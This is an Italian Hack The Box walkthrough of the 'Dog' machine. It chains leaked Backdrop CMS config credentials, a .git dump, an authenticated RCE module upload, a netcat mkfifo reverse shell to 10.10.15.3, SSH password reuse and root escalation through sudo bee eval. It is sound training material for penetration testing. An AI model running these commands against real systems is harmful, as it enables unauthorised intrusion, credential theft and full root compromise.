```txt
                 .-'''-.              
_______         '   _    \            
\  ___ `'.    /   /` '.   \           
 ' |--.\  \  .   |     \  '  .--./)   
 | |    \  ' |   '      |  '/.''\\    
 | |     |  '\    \     / /| |  | |   
 | |     |  | `.   ` ..' /  \`-' /    
 | |     ' .'    '-...-'`   /("'`     
 | |___.' /'                \ '---.   
/_______.'/                  /'""'.\  
\_______|/                  ||     || 
                            \'. __//  
                             `'---'   

------------------------------------------------------------------------------

[ 0x01 ] Abstract
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTB DOG - Walkthrough tecnico by NoFlyFre
Target: dog.htb

------------------------------------------------------------------------------

[ 0x02 ] Enumeration
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmap -sS -p- dog -T5

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Sul sito web su porta 80 ci sono pagine di login/reset password.
L'input nella pagina di reset viene riflesso direttamente nell'HTML:
Sorry, abc; is not recognized as a user name or an email address.

Note in fondo pagina: Powered by Backdrop CMS

------------------------------------------------------------------------------

[ 0x03 ] Config e Git leak
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Backdrop salva le configurazioni in:
http://dog/files/config_<hash>/active/

Trovato: config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/
Nei file config si trova l’email tiffany@dog.htb e le credenziali in settings.php:
'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop'

Accessibile anche la root del repo Git:
http://dog/.git
git-dumper http://dog/.git dog_repo

------------------------------------------------------------------------------

[ 0x04 ] Admin Login & Exploit
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Con la password trovata si accede all’admin di Backdrop CMS 1.27.1.

searchsploit CMS 1.27.1
Backdrop CMS 1.27.1 - Authenticated RCE | php/webapps/52021.py

python3 52021.py http://dog
tar -czf shell.tar.gz shell/
Upload modulo da interfaccia admin: http://dog/admin/modules/install

Accesso a: http://dog/modules/shell/shell.php
Reverse shell:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.3 8080 >/tmp/f

Listener:
nc -lvnp 8080

------------------------------------------------------------------------------

[ 0x05 ] Accesso come johncusack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
La stessa password MySQL funziona per l’utente johncusack via SSH:
ssh johncusack@dog
Password: BackDropJ2024DS2024

cat ~/user.txt
[REDACTED]

------------------------------------------------------------------------------

[ 0x06 ] Privilege Escalation via bee
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo -l
(ALL : ALL) /usr/local/bin/bee

ls -l /usr/local/bin/bee
lrwxrwxrwx 1 root root 26 Jul  9  2024 /usr/local/bin/bee -> /backdrop_tool/bee/bee.php

sudo /usr/local/bin/bee --root=/var/www/html eval "system('id');"
uid=0(root) gid=0(root) groups=0(root)

Per shell completa:
sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"
cat /root/root.txt
[REDACTED]

------------------------------------------------------------------------------

[ 0x07 ] Summary
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Step          | Description
--------------|----------------------------------------------------------
Enumeration   | Backdrop CMS e leak nei file di configurazione
Git Leak      | Dump del repo tramite .git/
Admin Login   | Credenziali da settings.php
Exploit       | RCE autenticato con modulo Backdrop (tar.gz)
Reverse Shell | Shell via PHP webshell
SSH           | Login come johncusack con stessa password
PrivEsc       | sudo bee consente esecuzione comandi root
Root Flag     | Letta da /root/root.txt

Rooted!

------------------------------------------------------------------------------

[ 0x08 ] Tags / Keywords
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
security, htb, walkthrough, pentest, NoFlyFre, hacking, writeup, dog

[ 0x09 ] Lingua
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ITA (Italiano)

------------------------------------------------------------------------------

[ 0x0A ] Credits & Disclaimer
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Autore: NoFlyFre
Tutti i contenuti sono a scopo educativo e di ethical hacking.
Usa queste informazioni in modo responsabile.

------------------------------------------------------------------------------

        .: Knowledge, Skillz, Root :.
          .: Stay curious! :.
```